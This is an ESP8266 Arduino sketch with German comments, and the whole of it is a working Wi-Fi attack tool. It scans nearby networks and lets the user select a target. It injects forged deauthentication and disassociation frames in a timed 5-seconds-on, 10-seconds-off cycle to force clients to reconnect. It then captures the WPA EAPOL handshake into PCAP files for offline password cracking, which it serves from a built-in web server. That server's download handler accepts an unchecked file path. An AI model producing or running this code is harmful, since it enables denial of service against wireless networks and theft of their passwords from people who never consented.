#include <ESP8266WiFi.h>
#include <FS.h> 
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
  // Deklaration der nativen ESP8266 SDK-Injektionsfunktion
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// Manuelle Definition der rx_control Struktur für alte Core-Versionen (z.B. v2.0.0)
struct rx_control {
    signed rssi : 8;
    unsigned rate : 4;
    unsigned is_group : 1;
    unsigned : 1;
    unsigned sig_mode : 2;
    unsigned legacy_length : 12;
    unsigned damatch0 : 1;
    unsigned damatch1 : 1;
    unsigned bssidmatch0 : 1;
    unsigned bssidmatch1 : 1;
    unsigned mcs : 7;
    unsigned cwb : 1;
    unsigned HT_length : 16;
    unsigned Smoothing : 1;
    unsigned Not_Sounding : 1;
    unsigned : 1;
    unsigned Aggregation : 1;
    unsigned STBC : 2;
    unsigned FEC_CODING : 1;
    unsigned SGI : 1;
    unsigned rx_end_state : 8;
    unsigned ampdu_cnt : 8;
    unsigned channel : 4;
    unsigned : 12;
};

// PCAP-Strukturen für Wireshark-Kompatibilität
typedef struct {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} __attribute__((packed)) pcap_global_header_t;

typedef struct {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} __attribute__((packed)) pcap_record_header_t;

// Netzwerk-Struktur
typedef struct {
  String ssid;
  uint8_t bssid[6];
  int ch;
  int rssi;
  String encryption;
} WiFiNetwork;

// Globale Variablen
WiFiNetwork networks[20];
WiFiNetwork target;
uint8_t* pcap_buffer = nullptr;
size_t pcap_size = 0;
bool handshake_captured = false;
bool beacon_captured = false;
uint8_t eapol_count = 0;
bool with_deauth = false;
bool is_capturing = false;
uint16_t global_seq = 0;

// Variablen für das 5s AN / 10s AUS Deauth-Intervall
unsigned long deauth_state_timer = 0;
bool deauth_active_phase = true; 

ESP8266WebServer server(80);
const char* ap_ssid = "HandshakeCapture";
const char* ap_password = "capture123";

// Das Paket-Template nach ESP8266-Vorgabe (26 Bytes)
uint8_t injection_packet[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (wird überschrieben)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (wird überschrieben)
    0x00, 0x00,                         // Seq
    0x07, 0x00                          // Reason
};

// Funktionsprototypen
void scanNetworks();
void listNetworks();
void selectTarget();
void startCapture(bool deauth);
void stopCapture();
void saveHandshake();
void promiscuousRxCallback(uint8_t* buf, uint16_t len);
void pcapInit();
void pcapAppend(const uint8_t* frame, size_t len);
void sendDeauth();
void startWebServer();
void handleRoot();
void handleDownload();
void handleListFiles();
void printHelp();

void sniffer_callback(uint8_t *buf, uint16_t len) {
  promiscuousRxCallback(buf, len);
}

void setup() {
  Serial.begin(115200);
  delay(500);
  
  if (!SPIFFS.begin()) {
    Serial.println("Failed to mount SPIFFS. Formatiere...");
    SPIFFS.format();
    if(!SPIFFS.begin()) {
      while(1) delay(1000);
    }
  }

  WiFi.mode(WIFI_AP_STA);
  wifi_set_opmode(STATIONAP_MODE);
  
  WiFi.softAP(ap_ssid, ap_password);
  Serial.print("AP IP Adresse: ");
  Serial.println(WiFi.softAPIP());

  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  
  startWebServer();
  
  Serial.println("\nESP8266 Handshake Capture Tool bereit.");
  printHelp();
}

void loop() {
  server.handleClient();
  
  // FIX: Verhindert "Aufnahme läuft bereits"-Schleifen durch radikales Buffer-Leeren
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    
    while(Serial.available()) Serial.read(); 
    
    if (input == "1") scanNetworks();
    else if (input == "2") listNetworks();
    else if (input == "3") selectTarget();
    else if (input == "4") startCapture(true);
    else if (input == "5") startCapture(false);
    else if (input == "6") stopCapture();
    else if (input == "7") handleListFiles();
    else if (input == "8") printHelp();
    else if (input == "9") {
      Serial.println("Restarting...");
      ESP.restart();
    }
  }

  // Intervall-Steuerung (5s AN, 10s AUS)
  if (is_capturing && with_deauth) {
    unsigned long current_time = millis();
    
    if (deauth_active_phase) {
      static unsigned long last_packet_time = 0;
      if (current_time - last_packet_time > 500) {
        sendDeauth();
        last_packet_time = current_time;
      }
      
      if (current_time - deauth_state_timer >= 5000) {
        deauth_active_phase = false;
        deauth_state_timer = current_time;
        Serial.println("\n[System] Deauther PAUSE (10s Listening-Phase startet)...");
      }
    } 
    else {
      if (current_time - deauth_state_timer >= 10000) {
        deauth_active_phase = true;
        deauth_state_timer = current_time;
        Serial.println("\n[System] Deauther AKTIV (5s Angriffs-Phase startet)...");
      }
    }
  }

  yield();
}

void printHelp() {
  Serial.println("\nBefehle:");
  Serial.println("1 - Netzwerke scannen");
  Serial.println("2 - Gescannte Netzwerke auflisten");
  Serial.println("3 - Ziel per ID auswaehlen");
  Serial.println("4 - Capture starten MIT Deauth (5s an / 10s aus)");
  Serial.println("5 - Capture starten OHNE Deauth");
  Serial.println("6 - Capture stoppen");
  Serial.println("7 - PCAP-Dateien auflisten");
  Serial.println("8 - Hilfe anzeigen");
  Serial.println("9 - ESP8266 Neustarten");
}

void scanNetworks() {
  Serial.println("\nScanne Netzwerke...");
  
  bool was_capturing = is_capturing;
  if (was_capturing) wifi_promiscuous_enable(0);
  
  int n = WiFi.scanNetworks(false); 
  
  if (n <= 0) {
    Serial.println("Keine Netzwerke gefunden.");
    if (was_capturing) wifi_promiscuous_enable(1);
    return;
  }

  memset(networks, 0, sizeof(networks));
  int limit = (n < 20) ? n : 20;

  for (int i = 0; i < limit; i++) {
    String current_ssid = WiFi.SSID(i);
    if (current_ssid.length() == 0) {
      networks[i].ssid = "<HIDDEN>";
    } else {
      networks[i].ssid = current_ssid;
    }
    
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    
    uint8_t encryption = WiFi.encryptionType(i);
    if (encryption == ENC_TYPE_NONE) networks[i].encryption = "Open";
    else if (encryption == ENC_TYPE_WEP) networks[i].encryption = "WEP";
    else if (encryption == ENC_TYPE_TKIP) networks[i].encryption = "WPA";
    else if (encryption == ENC_TYPE_CCMP) networks[i].encryption = "WPA2";
    else if (encryption == ENC_TYPE_AUTO) networks[i].encryption = "WPA/WPA2";
    else networks[i].encryption = "Unknown";
  }
  
  Serial.printf("Erfolgreich %d Netzwerke gefunden.\n", n);
  if (was_capturing) wifi_promiscuous_enable(1);
}

void listNetworks() {
  Serial.println("\nGescannte Netzwerke:");
  Serial.println("ID | SSID             | BSSID           | CH | RSSI  | Encryption");
  Serial.println("---------------------------------------------------------------");
  
  for (int i = 0; i < 20; i++) {
    if (networks[i].ssid == "") continue;
    
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             networks[i].bssid[0], networks[i].bssid[1], networks[i].bssid[2],
             networks[i].bssid[3], networks[i].bssid[4], networks[i].bssid[5]);
    
    Serial.printf("%2d | %-16s | %s | %2d | %5d | %s\n", 
                 i, networks[i].ssid.c_str(), bssidStr, 
                 networks[i].ch, networks[i].rssi, networks[i].encryption.c_str());
  }
}

void selectTarget() {
  listNetworks();
  Serial.print("\nZiel-ID eingeben: ");
  
  while (!Serial.available()) { delay(10); yield(); }
  int id = Serial.parseInt();
  while(Serial.available()) Serial.read();
  
  if (id >= 0 && id < 20 && networks[id].ssid != "") {
    target = networks[id];
    Serial.printf("\nZiel gewaehlt: %s auf Kanal %d\n", target.ssid.c_str(), target.ch);
                 
    memcpy(&injection_packet[10], target.bssid, 6); 
    memcpy(&injection_packet[16], target.bssid, 6); 
  } else {
    Serial.println("Ungueltige Auswahl.");
  }
}

void startCapture(bool deauth) {
  if (target.ssid == "") {
    Serial.println("Kein Ziel ausgewaehlt!");
    return;
  }

  if (is_capturing) {
    Serial.println("Aufnahme laeuft bereits.");
    return;
  }

  Serial.printf("\nStarte Handshake-Capture...\n");
  
  pcapInit();
  handshake_captured = false;
  beacon_captured = false;
  eapol_count = 0;
  with_deauth = deauth;
  is_capturing = true;
  
  deauth_state_timer = millis();
  deauth_active_phase = true; 
  
  wifi_set_channel(target.ch);
  wifi_promiscuous_enable(1);
}

void stopCapture() {
  if (!is_capturing) return;
  wifi_promiscuous_enable(0);
  is_capturing = false;

  if (pcap_size > sizeof(pcap_global_header_t)) {
    saveHandshake();
  } else {
    Serial.println("Kein Handshake aufgezeichnet.");
    free(pcap_buffer);
    pcap_buffer = nullptr;
    pcap_size = 0;
  }
}

void saveHandshake() {
  String filename = "/handshake_" + target.ssid + ".pcap";
  filename.replace(" ", "_"); 
  
  File file = SPIFFS.open(filename, "w");
  if (!file) {
    Serial.println("Fehler beim Erstellen der PCAP-Datei.");
    return;
  }
  
  if (file.write(pcap_buffer, pcap_size) == pcap_size) {
    Serial.printf("Datei erfolgreich gespeichert: %s\n", filename.c_str());
  } else {
    Serial.println("Fehler beim Schreiben.");
  }
  
  file.close();
  free(pcap_buffer);
  pcap_buffer = nullptr;
  pcap_size = 0;
}

// FIX: Robuste Offset-Filterung für EAPOL- und QoS-Datenframes (0x88)
void promiscuousRxCallback(uint8_t* buf, uint16_t len) {
  if (!is_capturing) return;

  uint8_t* payload;
  uint16_t packet_len;

  // Prüfe die typischen ESP8266-Sniffer-Buffer-Längen, um die rx_control-Struktur sauber abzuziehen
  if (len == 128 || len == 60 || len == 120 || len == 64) { 
    struct rx_control *rx_ctrl = (struct rx_control *)buf;
    payload = buf + sizeof(struct rx_control);
    packet_len = rx_ctrl->legacy_length;
  } else {
    payload = buf;
    packet_len = len;
  }

  if (packet_len < 34) return;

  uint8_t frame_type = payload[0];

  // 1. Beacon-Filter (Offset 10)
  if (frame_type == 0x80 && !beacon_captured) {
    if (memcmp(&payload[10], target.bssid, 6) == 0) {
      Serial.println("[Sniffer] Beacon Frame gesichert!");
      beacon_captured = true;
      pcapAppend(payload, packet_len);
    }
    return;
  }

  // 2. EAPOL-Filter (Unterstützt Standard-Daten 0x08 und QoS-Daten 0x88)
  if (frame_type == 0x08 || frame_type == 0x88) {
    if (memcmp(&payload[4], target.bssid, 6) == 0 || memcmp(&payload[10], target.bssid, 6) == 0) {
      
      // QoS Data Frames verschieben den Ethertype-Header um genau 2 Bytes nach hinten
      uint8_t llc_offset = (frame_type == 0x88) ? 32 : 30; 
      
      uint16_t ethertype = (payload[llc_offset] << 8) | payload[llc_offset + 1];
      if (ethertype == 0x888E) { 
        eapol_count++;
        Serial.printf("[Sniffer] EAPOL Frame %d/4 erkannt!\n", eapol_count);
        pcapAppend(payload, packet_len);

        if (eapol_count >= 4) {
          handshake_captured = true;
          Serial.println("---> Handshake komplett!");
          stopCapture();
        }
      }
    }
  }
}

void pcapInit() {
  free(pcap_buffer);
  pcap_size = sizeof(pcap_global_header_t);
  pcap_buffer = (uint8_t*)malloc(pcap_size);

  pcap_global_header_t header = {
    .magic_number = 0xa1b2c3d4,
    .version_major = 2,
    .version_minor = 4,
    .thiszone = 0,
    .sigfigs = 0,
    .snaplen = 65535,
    .network = 105 
  };
  memcpy(pcap_buffer, &header, sizeof(header));
}

void pcapAppend(const uint8_t* frame, size_t len) {
  if (!frame || len == 0) return;

  pcap_record_header_t rec = {
    .ts_sec = (uint32_t)(millis() / 1000),
    .ts_usec = (uint32_t)((millis() % 1000) * 1000),
    .incl_len = (uint32_t)len,
    .orig_len = (uint32_t)len
  };

  uint8_t* new_buf = (uint8_t*)realloc(pcap_buffer, pcap_size + sizeof(rec) + len);
  if (!new_buf) return;

  memcpy(new_buf + pcap_size, &rec, sizeof(rec));
  memcpy(new_buf + pcap_size + sizeof(rec), frame, len);

  pcap_buffer = new_buf;
  pcap_size += sizeof(rec) + len;
}

void sendDeauth() {
  global_seq++;
  injection_packet[22] = (global_seq << 4) & 0xFF;
  injection_packet[23] = (global_seq >> 4) & 0xFF;

  injection_packet[0] = 0xC0;
  wifi_send_pkt_freedom(injection_packet, 26, 0);

  injection_packet[0] = 0xA0;
  wifi_send_pkt_freedom(injection_packet, 26, 0);

  Serial.println("Sent Deauth & Disas via SDK freedom packet.");
}

void startWebServer() {
  server.on("/", handleRoot);
  server.on("/download", handleDownload);
  server.on("/list", handleListFiles);
  server.begin();
}

void handleRoot() {
  server.send(200, "text/html", "<h1>ESP8266 Handshake Capture Tool</h1><p><a href='/list'>Files</a></p>");
}

void handleListFiles() {
  String html = "<h1>Aufzeichnungen</h1><ul>";
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    if(dir.fileName().endsWith(".pcap")) {
      html += "<li><a href='/download?file=" + dir.fileName() + "'>" + dir.fileName() + "</a></li>";
    }
  }
  html += "</ul>";
  server.send(200, "text/html", html);
}

void handleDownload() {
  if(!server.hasArg("file")) {
    server.send(400, "text/plain", "Missing arg");
    return;
  }
  String filename = server.arg("file");
  File file = SPIFFS.open(filename, "r");
  server.streamFile(file, "application/octet-stream");
  file.close();
}
